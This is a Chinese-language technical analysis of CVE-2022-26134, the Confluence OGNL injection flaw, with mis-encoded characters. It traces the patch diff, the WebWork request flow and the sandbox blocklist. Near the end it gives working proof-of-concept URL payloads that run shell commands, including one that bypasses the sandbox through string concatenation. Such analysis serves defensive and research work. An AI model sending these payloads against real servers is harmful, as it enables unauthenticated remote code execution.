> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1lTF8V4szkm9W-Ulqx7xlw)

æ¼æ´èƒŒæ™¯
----

å®˜æ–¹é“¾æ¥ï¼š`https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html`

<table style="visibility: visible;"><thead style="box-sizing: border-box; visibility: visible;"><tr style="box-sizing: border-box; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-top-style: solid; border-top-color: rgb(204, 204, 204); background-color: white; visibility: visible;"><th style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; font-weight: bold; background-color: rgb(240, 240, 240); min-width: 85px; visibility: visible;">Summary</th><th style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; font-weight: bold; background-color: rgb(240, 240, 240); min-width: 85px; visibility: visible;">CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability in Confluence Server and Data Center</th></tr></thead><tbody style="box-sizing: border-box; border-width: 0px; border-style: initial; border-color: initial; visibility: visible;"><tr style="box-sizing: border-box; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-top-style: solid; border-top-color: rgb(204, 204, 204); background-color: white; visibility: visible;"><td style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; min-width: 85px; visibility: visible;">Advisory Release Date</td><td style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; min-width: 85px; visibility: visible;">02 Jun 2022 1 PM PDT (Pacific Time, -7 hours)</td></tr><tr style="box-sizing: border-box; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-top-style: solid; border-top-color: rgb(204, 204, 204); background-color: rgb(248, 248, 248); visibility: visible;"><td style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; min-width: 85px; visibility: visible;">Affected Products</td><td style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; min-width: 85px; visibility: visible;">ConfluenceConfluence ServerConfluence Data Center</td></tr><tr style="box-sizing: border-box; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-top-style: solid; border-top-color: rgb(204, 204, 204); background-color: white; visibility: visible;"><td style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; min-width: 85px; visibility: visible;">Affected Versions</td><td style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; min-width: 85px; visibility: visible;">All&nbsp;<strong style="box-sizing: border-box; font-weight: bold; color: rgb(14, 136, 235); visibility: visible;">supported</strong>&nbsp;versions of Confluence Server and Data Center are affected.Confluence Server and Data Center versions after 1.3.0 are affected.</td></tr><tr style="box-sizing: border-box; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-top-style: solid; border-top-color: rgb(204, 204, 204); background-color: rgb(248, 248, 248); visibility: visible;"><td style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; min-width: 85px; visibility: visible;">Fixed Versions</td><td style="box-sizing: border-box; font-size: 13px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 5px 10px; text-align: left; min-width: 85px; visibility: visible;">7.4.17<br style="box-sizing: border-box; visibility: visible;">7.13.7<br style="box-sizing: border-box; visibility: visible;">7.14.3<br style="box-sizing: border-box; visibility: visible;">7.15.2<br style="box-sizing: border-box; visibility: visible;">7.16.4<br style="box-sizing: border-box; visibility: visible;">7.17.4<br style="box-sizing: border-box; visibility: visible;">7.18.1</td></tr></tbody></table>

æ‰€æœ‰ç‰ˆæœ¬çš„ Confluence å’Œ DataCenter éƒ½ä¼šå—å½±å“

ä¸´æ—¶ä¿®å¤æ–¹å¼ï¼š

*   7.15.0-7.18.0: æ›¿æ¢`xwork-1.0.3-atlassian-10.jar`æ–‡ä»¶
    
*   6.0.0-7.14.2: æ›¿æ¢ä»¥ä¸‹æ–‡ä»¶
    

*   xwork-1.0.3-atlassian-10.jar
    
*   webwork-2.1.5-atlassian-4.jar
    
*   CachedConfigurationProvider.class
    

ä»£ç åˆ†æ
----

### diff è¡¥ä¸

å¯¹`xwork-1.0.3-atlassian-10.jar`å’Œä½ç‰ˆæœ¬è¿›è¡Œåç¼–è¯‘ diff

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

åŒºåˆ«åœ¨äºå°†

```
finalNamespaceÂ =Â TextParseUtil.translateVariables(this.namespace,Â stackÂ =Â ActionContext.getContext().getValueStack())  
finalActionNameÂ =Â TextParseUtil.translateVariables(this.actionName,Â stack))  

```

ä¿®æ”¹ä¸º

```
finalNamespaceÂ =Â this.namespace,Â   
finalActionNameÂ =Â this.actionName  

```

å°‘äº†`TextParseUtil.translateVariables()`çš„æµç¨‹

è¯¥å‡½æ•°å¤„ç†è°ƒç”¨äº†

```
ObjectÂ oÂ =Â OgnlValueStack.findValue(g);  
  
...  
  
Ognl.getValue(OgnlUtil.compile(expr),Â this.context,Â this.root);  

```

è¾ƒä¸ºæ˜æ˜¾çš„`ognl`è¡¨è¾¾å¼æ³¨å…¥ï¼Œé‚£æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å…·ä½“çš„è§¦å‘æµç¨‹ã€‚

### WebWork æ¡†æ¶åˆ†æ

`Confluence`Â ä½¿ç”¨Â `WebWork`Â æ¡†æ¶ï¼Œæ¡†æ¶è°ƒç”¨æµè½¬å›¾, æ•´ä¸ª HTTP è¯·æ±‚é€»è¾‘æ˜¯éšç€è¿™ä¸ªæ¡†æ¶å¤„ç†æµç¨‹æ¥çš„ã€‚

1.  å®¢æˆ·å‘èµ· HTTP æµç¨‹è®¿é—®
    
2.  æŒ‰ç…§ servlet è§„èŒƒï¼Œå…ˆç”± filter è¿›è¡Œå¤„ç†ï¼Œç„¶åç”± WebWork æ ¸å¿ƒæ§åˆ¶å™¨Â `ServletDispatcher`Â è¿›è¡Œå¤„ç†
    
3.  WebWork æ ¹æ®Â `xwork.xml`Â é…ç½®æ–‡ä»¶ æ¥å¤„ç†è¯·æ±‚ï¼šåœ¨é…ç½®æ–‡ä»¶ä¸­å®šä¹‰è·¯ç”±å¯¹åº”çš„æ‹¦æˆªå™¨ï¼Œä¸šåŠ¡é€»è¾‘ï¼Œä¸šåŠ¡é€»è¾‘å“åº”ç­‰éƒ¨åˆ†
    
4.  å…ˆä¾æ¬¡è°ƒç”¨æ‹¦æˆªå™¨(before),ç„¶åå†ç”±ä¸šåŠ¡é€»è¾‘å¤„ç†
    
5.  æ ¹æ®ä¸šåŠ¡é€»è¾‘è¿”å›çš„å“åº”ç±»å‹å¯¹å“åº”è¿›è¡Œæ¸²æŸ“
    
6.  ä¾æ¬¡è°ƒç”¨æ‹¦æˆªå™¨(after),ç„¶åå°†å“åº”è¾“å‡º
    

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRZ4aG7PIicfHMZVic6LvY3ZxnhCZZsWekA4ImxOh58uIh5afadSJdhb8QYzNMvbNarlK2HEZeCiarJw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

confluence åœ¨`web.xml`ä¸­å¼•å…¥`WebWork`æ¡†æ¶é…ç½®

```
<servlet>  
Â <servlet-name>action</servlet-name>  
Â <servlet-class>com.atlassian.confluence.servlet.ConfluenceServletDispatcher</servlet-class>  
Â <load-on-startup>1</load-on-startup>  
</servlet>  
  
  
<servlet-mapping>  
Â <servlet-name>action</servlet-name>  
Â <url-pattern>*.action</url-pattern>  
</servlet-mapping>  

```

`ConfluenceServletDispatcher`åŸºç±»`com.opensymphony.webwork.dispatcher.ServletDispatcher`

æ¡†æ¶é…ç½®è¯´æ˜æ–‡ä»¶ï¼š`xwork.xml`æ–‡ä»¶ï¼Œåœ¨ jar åŒ…`confluence-ç‰ˆæœ¬å·.jar`ä¸­

å¯¹é…ç½®æ–‡ä»¶è¿›è¡Œè¯´æ˜

#### ä¸€ä¸ªDemo ğŸŒ°

action æ˜ å°„é€»è¾‘ï¼ŒæŒ‡å®š url æ˜ å°„çš„å¤„ç†ç±»

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

è¯·æ±‚å¦‚ä¸‹çš„url`/person/jasperList.action`

1.  package å‘½åç©ºé—´ nameï¼š`person`, namespaceÂ `person`Â , å¯¹åº”ä¸€çº§è·¯å¾„
    
2.  action æœ€å°çš„å¤„ç†å•å…ƒï¼Œnameï¼š`jasperList`, å¯¹åº”äºŒçº§è·¯å¾„ï¼Œclass å¤„ç†ç±»ï¼š`com.opensymphony.webwork.showcase.jasper.JasperAction`
    
3.  result å“åº”ç»“æœæ˜¯æšä¸¾ç±»å‹ "success", å“åº”ç±»å‹ä¸ºÂ `jasper`
    
4.  param å‚æ•°ï¼šå‚æ•°åå’Œå‚æ•°ç±»å‹
    

#### å†ä¸¾ä¸€ä¸ªä¾‹å­ login.action

confluence 7.4.10 ç‰ˆæœ¬ xwork.xml æ–‡ä»¶ï¼Œ`default`å‘½åç©ºé—´ä¸‹çš„`login action`ï¼Œè®¿é—®è·¯å¾„`/login.action`

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRZ4aG7PIicfHMZVic6LvY3ZxjN7D8INO41UnTHaJUyicDcB7k1M80BpPpqXjCeNxssZgaumkr9hhPrQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

1.  package å‘½åç©ºé—´ name:`default`,åœ¨æœªåŒ¹é…åˆ°å‘½åç©ºé—´çš„æƒ…å†µä¸‹æ˜ å°„åˆ°è¯¥å‘½åç©ºé—´å¤„ç†ã€‚ï¼ˆæ³¨æ„æ­¤åˆ»ä¸€çº§ç›®å½•ä¸ºç©ºï¼‰
    
2.  action nameï¼š`login`, class å¤„ç†ç±»:`com.atlassian.confluence.user.actions.LoginAction`Â , å¤„ç†æ–¹æ³•`doDefault`
    
3.  `interceptor-ref`ï¼š`validatingStack`ï¼Œå¼•ç”¨æ‹¦æˆªå™¨`validatingStack`
    
4.  `å“åº”ç»“æœ`input, ç±»å‹ä¸º velocity,ä½¿ç”¨`login.vm`è¿›è¡Œæ¸²æŸ“
    

`interceptor-ref`é…ç½®çš„æ‹¦æˆªå™¨é›†åˆ`validatingStack`,å…¶ä¸­åˆå¼•ç”¨äº†`defaultStack`,`captcha`,`validator`,`workflow`,`profiling`ç­‰æ‹¦æˆªå™¨, æ‹¦æˆªå™¨é›†åˆæ˜¯å¯ä»¥è¿›è¡ŒåµŒå¥—çš„ã€‚

```
 <interceptor-stackÂ >  
Â <interceptor-refÂ />  
  
Â <!--MustÂ comeÂ afterÂ pageAwareÂ andÂ spaceAware,Â asÂ theÂ viewÂ renderedÂ inÂ aÂ responseÂ toÂ aÂ failedÂ validationÂ mayÂ accessÂ propertiesÂ ofÂ pageÂ and/orÂ spaceÂ objects.-->  
Â <interceptor-refÂ />  
  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ >  
Â Â <paramÂ >AfterÂ validatingStack</param>  
Â </interceptor-ref>  
</interceptor-stack>
```

#### å†å†ä¸¾ä¸€ä¸ªä¾‹å­ index.action

åœ¨`default`å‘½åç©ºé—´ä¸‹ï¼Œé»˜è®¤è®¿é—®çš„ action ä¸º`index`ï¼Œè®¿é—®æ ¹ç›®å½•ä¼šä½¿ç”¨`index`è¿›è¡Œå“åº”

```
<actionÂ >  
Â <interceptor-refÂ />  
Â <resultÂ >${location}</result>  
Â <resultÂ >${location}</result>  
</action>  

```

é…ç½®äº†`defaultStack`è¿›è¡Œå¤„ç†

çœ‹ä¸€ä¸‹`defaultStack`æ‹¦æˆªå™¨çš„é…ç½®ï¼Œæ³¨æ„æ‹¦æˆªå™¨æ˜¯æŒ‰ç…§é…ç½®ä¾æ¬¡è°ƒç”¨çš„ï¼Œå­˜åœ¨é¡ºåºã€‚

```
<interceptor-stackÂ >  
Â <interceptor-refÂ >  
Â Â <paramÂ >BeforeÂ defaultStack</param>  
Â </interceptor-ref>  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <!--Â MustÂ comeÂ afterÂ pageAwareÂ andÂ spaceAwareÂ toÂ makeÂ sureÂ thatÂ pagesÂ andÂ spacesÂ areÂ loaded-->  
Â <!--Â MustÂ comeÂ beforeÂ permissionsÂ asÂ isPermittedÂ mightÂ requireÂ someÂ bootstrapping-->  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <!--Â It'sÂ aÂ goodÂ ideaÂ toÂ putÂ thisÂ afterÂ theÂ permissionsÂ check,Â inÂ caseÂ youÂ canÂ determineÂ theÂ existence  
Â Â Â ofÂ aÂ spaceÂ byÂ whetherÂ theÂ errorÂ pageÂ isÂ themed!Â -->  
Â <interceptor-refÂ />  
  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <!--MustÂ comeÂ afterÂ pageAwareÂ andÂ spaceAwareÂ sinceÂ atÂ theÂ moment,Â someÂ implementationsÂ ofÂ ConfluenceActionSupport.getCancelResult(),Â doÂ workÂ againstÂ theÂ databaseÂ withÂ pagesÂ andÂ spaces.-->  
Â <!--AlsoÂ mustÂ comeÂ beforeÂ captcha,Â elseÂ aÂ formÂ withÂ captchaÂ won'tÂ beÂ cancellable.Â AlsoÂ mustÂ comeÂ beforeÂ theÂ validatorÂ (asÂ validationÂ shouldÂ beÂ skippedÂ onÂ cancel)-->  
Â <interceptor-refÂ />  
  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ />  
Â <interceptor-refÂ >  
Â Â <paramÂ >AfterÂ defaultStack</param>  
Â </interceptor-ref>  
</interceptor-stack>  

```

å…³æ³¨å…¶ä¸­çš„`confluenceAccess`æ‹¦æˆªå™¨ï¼Œè¯¥æ‹¦æˆªå™¨å®šä¹‰å¦‚ä¸‹

```
<interceptorÂ Â />  

```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRZ4aG7PIicfHMZVic6LvY3ZxBbydpQicdRWk7ccUqD5d0GDTjibiaAYPEnXs6WibUDuJiay7icaRa6tenA7g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

intercept å‡½æ•°

å¦‚æœ`!this.isAccessPermitted(actionInvocation)`è¿”å›ä¸ºå¦ï¼Œé‚£ä¹ˆè°ƒç”¨`actionInvocation.invoke()`, è°ƒç”¨ä¸‹ä¸€ä¸ª interceptï¼Œå¦‚æœè¿”å›ä¸º**çœŸ**ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æƒé™ï¼Œè¿”å›ä¸º`notpermitted`ã€‚

é»˜è®¤æœªæˆæƒè®¿é—®ï¼Œå³`action=index`æ—¶ï¼Œæ˜¯æ²¡æœ‰æƒé™çš„ï¼Œæ­¤åˆ»ä¼šå“åº”`notpermitted`ï¼Œ`result`ç±»å‹ä¹‹ä¸€

å¦‚æœæˆæƒä¼šè°ƒç”¨`actionInvocation.invoke()`,è°ƒç”¨ä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œå¦‚æœå“åº”`resultCode`,ä¼šè°ƒç”¨`this.execuResult()`, å¤§å®¶å¯ä»¥å›æƒ³ä¸€ä¸‹ WebWork çš„æ•°æ®æµå›¾ã€‚ä»£ç é€»è¾‘å¦‚ä¸‹

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRZ4aG7PIicfHMZVic6LvY3Zxicofz5VxAesVgicNxwzjpxZgesJ3MzhzlANa1AOY3JQFoQ71fR6H0YzA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

å¦‚æœå“åº”æœ‰æƒé™ï¼Œé‚£ä¹ˆä¼šé€’å½’è°ƒç”¨`actionInvocation.invoke()`, å¦åˆ™è¾“å‡º resultCode,è¿›å…¥ executeResult()ã€‚

æ¥ä¸‹æ¥è·Ÿè¸ªè°ƒç”¨æ ˆï¼Œ`ActionChainResult#exec`è°ƒç”¨äº†`TextParseUtil@translateVariables`, ç„¶åå°±å¿«è¿›åˆ° ongl è¡¨è¾¾å¼çš„æ‰§è¡Œæµç¨‹äº†

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

å¯çŸ¥ namespace æ˜¯æˆ‘ä»¬å¯æ§çš„ url è·¯å¾„å‚æ•°

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRZ4aG7PIicfHMZVic6LvY3ZxebRvAxygz3iaY2DPJbe3Us9BOic5o4syzYccroIo8xe0SQNbPciav3L7Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

å¯ä»¥å‡½æ•°`com.opensymphony.xwork.util.OgnlValueStack#findValue`çœ‹åˆ°è°ƒç”¨`Ognl.getValue`å³å¯é€ æˆ ognl ä»£ç æ‰§è¡Œ

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRZ4aG7PIicfHMZVic6LvY3ZxlSiaY3H4jBYichv9zgG8MXVXoEn078gyA01rKwyGyc4picialDtGeXSDicw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

ç›¸åº”`poc`å¦‚ä¸‹

```
GETÂ /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/pwned%22%29%7D/Â HTTP/1.1  
Host:Â 10.211.55.8:8090  
User-Agent:Â Mozilla/5.0Â (Macintosh;Â IntelÂ MacÂ OSÂ XÂ 10.15;Â rv:101.0)Â Gecko/20100101Â Firefox/101.0  
Accept:Â text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language:Â en-CA,en-US;q=0.7,en;q=0.3  
Accept-Encoding:Â gzip,Â deflate  
DNT:Â 1  
Connection:Â close  
Cookie:Â JSESSIONID=4290F6F6B5E0E923B2905B45CBE887AB  
Upgrade-Insecure-Requests:Â 1  

```

### ç»•æ²™ç®±

å…³æ³¨ä¸€ä¸‹`com.opensymphony.xwork.util.OgnlValueStack#findValue`å®ç°

å®˜æ–¹è¯´æ˜ï¼šhttps://confluence.atlassian.com/doc/preparing-for-confluence-7-15-1087507468.html

åœ¨ 7.15 ç‰ˆæœ¬ä¸­æ·»åŠ ï¼Œé˜»æ­¢å¯¹ java ç‰¹å®šç±»å’Œç‰¹å®šåŒ…è®¿é—®ï¼Œä¸`https://struts.apache.org/security/#internal-security-mechanism`ç›¸ä¼¼

è¡¨è¾¾å¼ç»è¿‡`safeExpressionUtil.isSafeExpression`åˆ¤æ–­

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`com.opensymphony.xwork.util.SafeExpressionUtil`æ²™ç®±ç±»åˆ†æ

å…³é”®é…ç½®

*   xwork.excludedClasses - a comma-separated list of excluded classes.
    
*   xwork.excludedPackageNames - a comma-separated list of excluded packages, used to restrict all classes inside a particular package or its sub-packages.
    
*   xwork.allowedClasses - a comma-separated list of particular classes to be marked as allowed specifically, even if the parent package is restricted or its static method is used.
    

é»‘ç™½åå•åˆ—è¡¨

```
<constantÂ   
Â value="  
Â java.lang.Object,  
Â java.lang.Runtime,  
Â java.lang.System,  
Â java.lang.Class,  
Â java.lang.ClassLoader,  
Â java.lang.Shutdown,  
Â java.lang.ProcessBuilder,  
Â java.lang.Thread,  
Â sun.misc.Unsafe,  
Â com.opensymphony.xwork.ActionContext  
Â java.lang.Compiler,  
Â java.lang.InheritableThreadLocal,  
Â java.lang.Package,  
Â java.lang.Process,  
Â java.lang.RuntimePermission,  
Â java.lang.SecurityManager,  
Â java.lang.ThreadGroup,  
Â java.lang.ThreadLocal,  
Â javax.script.ScriptEngineManager,  
Â javax.servlet.ServletContext,  
Â javax.persistence.EntityManager,  
Â org.apache.tomcat.InstanceManager,  
Â org.springframework.context.ApplicationContext,  
Â com.atlassian.applinks.api.ApplicationLinkRequestFactory,  
Â com.atlassian.core.util.ClassLoaderUtils,  
Â com.atlassian.core.util.ClassHelper"Â />  
  
Â <constantÂ   
Â value="  
Â ognl,  
Â java.io,  
Â java.net,  
Â java.nio,  
Â javax,  
Â freemarker.core,  
Â freemarker.template,  
Â freemarker.ext.jsp,  
Â freemarker.ext.rhino,  
Â sun.misc,  
Â sun.reflect,  
Â javassist,  
Â org.apache.velocity,  
Â org.objectweb.asm,  
Â org.springframework.context,  
Â com.opensymphony.xwork.util,  
Â org.apache.tomcat,  
Â org.apache.catalina.core,  
Â org.wildfly.extension.undertow.deployment  
Â java.lang.reflect,  
Â com.atlassian.cache,  
Â com.atlassian.confluence.util.http,  
Â com.atlassian.failurecache,  
Â com.atlassian.vcache,  
Â com.atlassian.sal.api.net,  
Â com.google.common.cache,  
Â com.google.common.net,  
Â com.hazelcast,java.jms,  
Â java.rmi,  
Â javax.management,  
Â javax.naming,  
Â org.apache.catalina.session,  
Â org.apache.commons.httpclient,  
Â org.apache.httpcomponents.httpclient,  
Â org.apache.http.client,  
Â org.ehcache,  
Â com.google.common.reflect,  
Â com.sun.jmx,com.sun.jna,  
Â javax.xml,jdk.nashorn,  
Â net.bytebuddy,  
Â net.sf.cglib,org.apache.bcel,  
Â org.javassist,org.ow2.asm,  
Â sun.awt.shell,  
Â sun.corba,  
Â sun.invoke,  
Â sun.launcher,  
Â sun.management,  
Â sun.misc,  
Â sun.net,  
Â sun.nio,  
Â sun.print,  
Â sun.reflect,  
Â sun.rmi,  
Â sun.security,  
Â sun.tracing,  
Â sun.tools.jar,  
Â com.atlassian.activeobjects,  
Â com.atlassian.hibernate,  
Â java.sql,  
Â javax.persistence,  
Â javax.sql,  
Â liquibase,  
Â net.java.ao,  
Â net.sf.hibernate,  
Â com.atlassian.confluence.setup.bandana,  
Â com.atlassian.filestore,  
Â com.atlassian.media,  
Â com.google.common.io,  
Â java.util.jar,  
Â java.util.zip,  
Â org.apache.commons.io,  
Â com.atlassian.confluence.impl.util.sandbox,  
Â com.atlassian.confluence.util.io,  
Â com.atlassian.confluence.util.sandbox,  
Â com.atlassian.quartz,  
Â com.atlassian.scheduler,  
Â com.atlassian.utils.process,  
Â com.atlassian.util.concurrent,  
Â io.atlassian.util.concurrent,  
Â java.util.concurrent,  
Â org.apache.commons.exec,  
Â org.springframework.expression.spel,  
Â org.springframework.util.concurrent,  
Â org.quartz,  
Â oshi"Â />  
  
<constantÂ   
Â value="com.atlassian.confluence.util.GeneralUtil,  
Â Â java.io.Serializable,  
Â Â java.lang.reflect.Proxy,  
Â Â net.sf.hibernate.proxy.HibernateProxy,  
Â Â net.sf.cglib.proxy.Factory,  
Â Â java.io.ObjectInputValidation,  
Â Â net.java.ao.Entity,  
Â Â net.java.ao.RawEntity,  
Â Â net.java.ao.EntityProxyAccessor"Â />  

```

æ²™ç®±æ ¸å¿ƒé€»è¾‘ï¼Œè°ƒç”¨`OgnlUtil.compile`å¯¹è¡¨è¾¾å¼è¿›è¡Œè§£æï¼Œå¯¹æ¯ä¸€ä¸ª node compile ä¹‹åè¿›è¡Œé€’å½’çš„å®‰å…¨åˆ¤æ–­ã€‚

```
 privateÂ booleanÂ isSafeExpressionInternal(StringÂ expression,Â Set<String>Â visitedExpressions)Â {  
Â ifÂ (!this.SAFE_EXPRESSIONS_CACHE.contains(expression))Â {  
Â Â ifÂ (this.UNSAFE_EXPRESSIONS_CACHE.contains(expression))Â {  
Â Â Â returnÂ false;  
Â Â }  
  
Â Â ifÂ (this.isUnSafeClass(expression))Â {  
Â Â Â this.UNSAFE_EXPRESSIONS_CACHE.add(expression);  
Â Â Â returnÂ false;  
Â Â }  
  
Â Â ifÂ (SourceVersion.isName(this.trimQuotes(expression))Â &&Â this.allowedClassNames.contains(this.trimQuotes(expression)))Â {  
Â Â Â this.SAFE_EXPRESSIONS_CACHE.add(expression);  
Â Â }Â elseÂ {  
Â Â Â tryÂ {  
Â Â Â Â ObjectÂ parsedExpressionÂ =Â OgnlUtil.compile(expression);  
Â Â Â Â ifÂ (parsedExpressionÂ instanceofÂ Node)Â {  
Â Â Â Â Â ifÂ (this.containsUnsafeExpression((Node)parsedExpression,Â visitedExpressions))Â {  
Â Â Â Â Â Â this.UNSAFE_EXPRESSIONS_CACHE.add(expression);  
Â Â Â Â Â Â log.debug(String.format("UnsafeÂ clauseÂ foundÂ inÂ [\"Â %sÂ \"]",Â expression));  
Â Â Â Â Â }Â elseÂ {  
Â Â Â Â Â Â this.SAFE_EXPRESSIONS_CACHE.add(expression);  
Â Â Â Â Â }  
Â Â Â Â }  
Â Â Â }Â catchÂ (RuntimeExceptionÂ |Â OgnlExceptionÂ var4)Â {  
Â Â Â Â this.SAFE_EXPRESSIONS_CACHE.add(expression);  
Â Â Â Â log.debug("CannotÂ verifyÂ safetyÂ ofÂ OGNLÂ expression",Â var4);  
Â Â Â }  
Â Â }  
Â }  
  
Â returnÂ this.SAFE_EXPRESSIONS_CACHE.contains(expression);  
}
```

é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡ node ç±»å‹ä¸º`ASTconstant`åˆ¤æ–­é€»è¾‘

```
privateÂ booleanÂ containsUnsafeExpression(NodeÂ node,Â Set<String>Â visitedExpressions)Â {  
Â StringÂ nodeClassNameÂ =Â node.getClass().getName();  
Â ifÂ (UNSAFE_NODE_TYPES.contains(nodeClassName))Â {  
Â Â returnÂ true;  
Â }Â elseÂ ifÂ ("ognl.ASTStaticMethod".equals(nodeClassName)Â &&Â !this.allowedClassNames.contains(getClassNameFromStaticMethod(node)))Â {  
Â Â returnÂ true;  
Â }Â elseÂ ifÂ ("ognl.ASTProperty".equals(nodeClassName)Â &&Â this.isUnSafeClass(node.toString()))Â {  
Â Â returnÂ true;  
Â }Â elseÂ ifÂ ("ognl.ASTMethod".equals(nodeClassName)Â &&Â this.unsafeMethodNames.contains(getMethodInOgnlExp(node)))Â {  
Â Â returnÂ true;  
Â }Â elseÂ ifÂ ("ognl.ASTVarRef".equals(nodeClassName)Â &&Â UNSAFE_VARIABLE_NAMES.contains(node.toString()))Â {  
Â Â returnÂ true;  
Â }Â elseÂ ifÂ ("ognl.ASTConst".equals(nodeClassName)Â &&Â !this.isSafeConstantExpressionNode(node,Â visitedExpressions))Â {  
Â Â returnÂ true;  
Â }Â elseÂ {  
Â Â for(intÂ iÂ =Â 0;Â iÂ <Â node.jjtGetNumChildren();Â ++i)Â {  
Â Â Â NodeÂ childNodeÂ =Â node.jjtGetChild(i);  
Â Â Â ifÂ (childNodeÂ !=Â nullÂ &&Â this.containsUnsafeExpression(childNode,Â visitedExpressions))Â {  
Â Â Â Â returnÂ true;  
Â Â Â }  
Â Â }  
  
Â Â returnÂ false;  
Â }  
}  

```

ä¸¤ä¸ªå…³é”®ç‚¹

1.  åˆ©ç”¨åå°„æ„é€ æ¶æ„å¯¹è±¡åŠå®ä¾‹
    
2.  åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å¸¸é‡åŒ¹é…
    

å¯¹åº” poc å¦‚ä¸‹

```
/%24%7BClass.forName(%22java%22%2B%22x.script.Script%22%2B%22EngineManager%22).newInstance().getEngineByName(%22nashorn%22).eval(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/test2%27)%22)%7D/ 
```

  

  

å¾€æœŸç²¾å½©æ–‡ç« 

  

  

  

  

